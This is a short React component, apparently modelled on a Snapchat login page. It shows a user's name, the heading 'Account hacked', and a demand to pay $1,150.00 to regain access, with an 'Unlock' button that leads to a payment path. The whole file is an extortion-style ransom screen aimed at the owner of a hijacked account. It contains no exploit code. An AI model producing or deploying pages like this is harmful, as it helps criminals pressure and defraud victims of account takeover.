import React from 'react'
import snap from "../assets/img.png"

export default function Login() {
  return (
    <div className='container'>
      <div className="mainwindow">
        <div className="image">
        <img src={snap} height={120} alt="" />
        </div>
        <p>maariya</p>

        <h2>Account hacked</h2>

        <p>This account has been hacked. To gain access to the account above, you will have to pay $1,150.00</p>
        <div className="button">
          <button onClick={()=> window.location.href = "/maariya/pay"}>Unlock</button>
        </div>
        
      </div>
      {/* <p>New to snapchat </p> */}
    </div>
  )
}
